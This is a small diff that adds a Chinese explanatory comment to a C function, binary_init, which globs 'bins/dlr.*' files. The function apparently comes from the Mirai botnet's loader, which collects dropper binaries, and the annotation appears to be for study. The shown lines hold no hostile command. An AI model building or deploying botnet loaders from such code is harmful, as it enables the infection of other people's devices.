@@ -12,7 +12,7 @@ BOOL binary_init(void)
 {
     glob_t pglob;
     int i;
-
+    //blog函数，查找所有bins/dlr.*文件
     if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
     {
         printf("Failed to load from bins folder!\n");
